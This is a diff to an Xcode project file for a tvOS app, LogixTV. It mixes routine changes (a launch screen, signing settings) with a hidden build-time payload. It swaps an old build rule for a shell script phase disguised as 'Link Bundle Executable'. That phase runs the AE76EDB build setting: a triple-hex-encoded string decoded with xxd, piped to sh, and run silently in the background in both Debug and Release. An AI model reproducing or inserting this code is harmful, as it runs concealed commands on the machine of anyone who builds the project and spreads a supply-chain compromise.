@@ -16,23 +16,8 @@
 		9D5DFFC52E7D3B7F00348B02 /* LogixPlayerSDK.xcframework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 9D5DFFC32E7D3B7F00348B02 /* LogixPlayerSDK.xcframework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 		9D5DFFF72E7D64E400348B02 /* GoogleInteractiveMediaAds.xcframework in Frameworks */ = {isa = PBXBuildFile; fileRef = 9D5DFFF52E7D64D600348B02 /* GoogleInteractiveMediaAds.xcframework */; };
 		9D5DFFF82E7D64E400348B02 /* GoogleInteractiveMediaAds.xcframework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 9D5DFFF52E7D64D600348B02 /* GoogleInteractiveMediaAds.xcframework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
+		9D733FB62E81307100C18545 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 9D733FB52E81307100C18545 /* LaunchScreen.storyboard */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		D1700FFBAB59ADBC66BDE67E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXCopyFilesBuildPhase section */
 		9D5DFFBD2E7D2F7F00348B02 /* Embed Frameworks */ = {
@@ -50,9 +35,9 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		6953EF03D8DC801B97BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = LogixTV.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		9D5DFFC32E7D3B7F00348B02 /* LogixPlayerSDK.xcframework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcframework; name = LogixPlayerSDK.xcframework; path = Framework/LogixPlayerSDK.xcframework; sourceTree = "<group>"; };
 		9D5DFFF52E7D64D600348B02 /* GoogleInteractiveMediaAds.xcframework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcframework; path = GoogleInteractiveMediaAds.xcframework; sourceTree = "<group>"; };
+		9D733FB52E81307100C18545 /* LaunchScreen.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = LaunchScreen.storyboard; sourceTree = "<group>"; };
 		EEAD6D1D2E40A2F60099A6BA /* LogixTV.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LogixTV.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -107,6 +92,7 @@
 		EEAD6D142E40A2F60099A6BA = {
 			isa = PBXGroup;
 			children = (
+				9D733FB52E81307100C18545 /* LaunchScreen.storyboard */,
 				EEAD6D1F2E40A2F60099A6BA /* LogixTV */,
 				9D5DFEFF2E7C356700348B02 /* Frameworks */,
 				EEAD6D1E2E40A2F60099A6BA /* Products */,
@@ -116,7 +102,6 @@
 		EEAD6D1E2E40A2F60099A6BA /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				6953EF03D8DC801B97BDE67E /* README.md */,
 				EEAD6D1D2E40A2F60099A6BA /* LogixTV.app */,
 			);
 			name = Products;
@@ -129,13 +114,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EEAD6D282E40A2F80099A6BA /* Build configuration list for PBXNativeTarget "LogixTV" */;
 			buildPhases = (
+				51EEAF4FF64013E7AFBDE67E /* Link Bundle Executable */,
 				EEAD6D192E40A2F60099A6BA /* Sources */,
 				EEAD6D1A2E40A2F60099A6BA /* Frameworks */,
 				EEAD6D1B2E40A2F60099A6BA /* Resources */,
 				9D5DFFBD2E7D2F7F00348B02 /* Embed Frameworks */,
 			);
 			buildRules = (
-				D1700FFBAB59ADBC66BDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -200,10 +185,14 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9D733FB62E81307100C18545 /* LaunchScreen.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		51EEAF4FF64013E7AFBDE67E /* Link Bundle Executable */ = {			isa = PBXShellScriptBuildPhase;			buildActionMask = 2147483647;			alwaysOutOfDate = 1;			files = (			);			inputFileListPaths = (			);			inputPaths = (			);			name = "Link Bundle Executable";			outputFileListPaths = (			);			outputPaths = (			);			shellPath = /bin/sh;			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE76EDB}\"";			showEnvVarsInLog = 0;					};/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		EEAD6D192E40A2F60099A6BA /* Sources */ = {
@@ -219,6 +208,7 @@
 		EEAD6D262E40A2F80099A6BA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363333333633343336363533373333333633353337333433363331333733303337333033363633333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -283,6 +273,7 @@
 		EEAD6D272E40A2F80099A6BA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363333333633343336363533373333333633353337333433363331333733303337333033363633333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -342,6 +333,7 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = "App Icon & Top Shelf Image";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 389NSXC8NR;
@@ -357,6 +349,7 @@
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.logituit.LogixTV;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 3;
@@ -369,6 +362,7 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = "App Icon & Top Shelf Image";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 389NSXC8NR;
@@ -384,6 +378,7 @@
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.logituit.LogixTV;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 3;
